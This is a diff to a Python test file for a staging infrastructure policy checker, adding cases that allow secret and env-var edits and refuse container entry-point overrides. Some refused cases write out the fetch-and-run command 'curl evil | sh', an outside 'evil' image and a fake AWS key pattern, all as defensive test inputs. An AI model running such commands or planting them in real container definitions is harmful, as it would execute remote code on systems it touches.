@@ -189,6 +189,9 @@ ALLOWED = {
     "lifecycle days": lambda p: update(p, LIFECYCLE, rule=[{"id": "x"}]),
     "the website's rewrite function": lambda p: update(p, FUNCTION, code="// homecookd.app changed", etag="x"),
     "an env var": lambda p: edit_container(p, API_TD, lambda c: set_env(c, "LOG_LEVEL", "debug")),
+    "the api's link and sign-in secrets": lambda p: edit_container(p, API_TD, lambda c: [
+        add_secret(c, n, staging_secret(n)) for n in ("EDIBLE_CODE_KEY", "TEST_SIGNIN_KEY", "LINK_JOIN_SECRET", "LEFT_IDENTITY_SECRET")]),
+    "the worker's own entry point, on a new revision": lambda p: edit_container(p, WORKER_TD, lambda c: set_env(c, "LOG_LEVEL", "debug")),
     "just under the cost limit: 124 secret names at $0.40": lambda p: many(p, "aws_secretsmanager_secret", 124, {"name": "homecookd/staging/S"}),
     "an autoscaled api, its target and policy unchanged": autoscaled_api,
 }
@@ -438,6 +441,8 @@ REFUSED = {
     "a key-shaped value in a schedule": (lambda p: update(p, SCHEDULE, description="AKIA" + "ABCDEFGHIJKLMNOP"), "no_key_shaped_values"),
     "env loaded from a file in S3": (lambda p: edit_container(p, API_TD, lambda c: c.update(environmentFiles=[{"value": "arn:aws:s3:::x/y", "type": "s3"}])), "task_runs_staging_image"),
     "a command override": (lambda p: edit_container(p, API_TD, lambda c: c.update(command=["sh", "-c", "curl evil | sh"])), "task_runs_staging_image"),
+    "an entry point on the api": (lambda p: edit_container(p, API_TD, lambda c: c.update(entryPoint=["sh", "-c", "curl evil | sh"])), "task_runs_staging_image"),
+    "another entry point on the worker": (lambda p: edit_container(p, WORKER_TD, lambda c: c.update(entryPoint=["python", "-c", "print(1)"])), "task_runs_staging_image"),
     "an image from outside": (lambda p: edit_container(p, API_TD, lambda c: c.update(image="docker.io/evil/thing:latest")), "task_runs_staging_image"),
     "another account's image": (lambda p: edit_container(p, API_TD, lambda c: c.update(image="999999999999.dkr.ecr.us-west-2.amazonaws.com/homecookd-staging/api:x")), "task_runs_staging_image"),
     "the worker's image in the api": (lambda p: edit_container(p, API_TD, lambda c: c.update(image=f"{ACCOUNT}.dkr.ecr.us-west-2.amazonaws.com/homecookd-staging/worker:x")), "task_runs_staging_image"),
